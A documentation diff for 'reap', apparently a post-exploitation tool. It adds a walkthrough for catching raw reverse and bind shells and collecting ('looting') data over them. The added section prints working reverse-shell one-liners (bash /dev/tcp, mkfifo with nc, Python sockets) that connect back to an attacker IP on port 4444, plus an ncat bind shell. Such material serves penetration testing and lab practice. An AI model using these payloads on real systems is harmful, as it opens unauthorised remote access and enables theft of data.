@@ -74,22 +74,63 @@ Match your situation:
   # --param NAME if it reads a different parameter; --method GET if it's a GET shell
   ```
 
-- **You caught (or will catch) a raw reverse/bind shell** → reap drives it directly:
-  - Reverse shell: `register listen <port>`, then fire your payload — reap becomes the
-    listener and catches the callback (don't use a separate `nc`).
-  - Bind shell: `register bind <host> <port>`.
-  - Windows `cmd.exe` shell: add `--shell cmd`.
-
-  reap wraps each command with a sentinel to recover its output and exit code over the raw
-  socket. There is no PTY, so interactive prompts (a sudo password, an editor) won't work —
-  reap only runs commands that return, so collection is fine. For stability-sensitive work,
-  upgrade to SSH instead: stabilize in **pwncat-vl**, drop your key, then `register ssh`.
+- **You caught (or will catch) a raw reverse/bind shell** → reap drives it directly, no
+  `nc` in between. See "Raw reverse & bind shells" below for the full walkthrough.
 
 - **Windows shell that isn't WinRM** → get/enable WinRM creds and `register winrm`,
   or drop a webshell on the IIS app and `register webshell`.
 
-> **Rule of thumb:** web RCE → `webshell`. Interactive shell or creds → get to
-> `ssh`/`winrm`. reap meets you at a *stable exec channel*, not a raw shell.
+> **Rule of thumb:** web RCE → `webshell`; SSH/WinRM creds → `ssh`/`winrm`; a caught
+> reverse or bind shell → `listen`/`bind`. reap meets you at a *stable exec channel*.
+
+### Raw reverse & bind shells
+
+reap can be the catcher itself — no `nc` in between. It wraps every command with a random
+sentinel and reads the socket until the sentinel returns, so it recovers each command's
+output and a real exit code over the bare shell.
+
+**Reverse shell** (the target connects back to you). Start the listener **first**, then fire
+your payload:
+
+```text
+reap> register listen 4444
+  listening on 0.0.0.0:4444 — fire your reverse shell now...
+```
+
+Now trigger the reverse shell through whatever RCE you have. `10.10.14.5` is *your*
+attacking/VPN IP and `4444` is the port you're listening on:
+
+```bash
+# Linux, bash /dev/tcp:
+bash -c 'bash -i >& /dev/tcp/10.10.14.5/4444 0>&1'
+
+# Linux, no /dev/tcp (fifo + nc):
+rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 10.10.14.5 4444 > /tmp/f
+
+# Python:
+python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("10.10.14.5",4444));[os.dup2(s.fileno(),f) for f in (0,1,2)];subprocess.call(["/bin/sh","-i"])'
+```
+
+The moment it connects, reap registers the session, auto-fingerprints it, and you `run`
+exactly like any other adapter.
+
+**Bind shell** (you dial in to a port the target is listening on):
+
+```bash
+# on the target, via your RCE — or the exploit opens the port itself:
+ncat -lvp 1337 -e /bin/bash
+```
+```text
+reap> register bind 10.10.10.5 1337
+```
+
+**Windows** `cmd.exe` shells (reverse or bind) — add `--shell cmd`, e.g.
+`register listen 4444 --shell cmd`.
+
+**Limits.** There is no PTY, so interactive prompts (a `sudo` password, `vi`, `top`) won't
+work — reap only sends commands that return, which is exactly what the collection modules
+do, so looting is unaffected. For a long or flaky engagement, SSH is the sturdier channel:
+stabilize in **pwncat-vl**, drop your key, then `register ssh`.
 
 ---
 
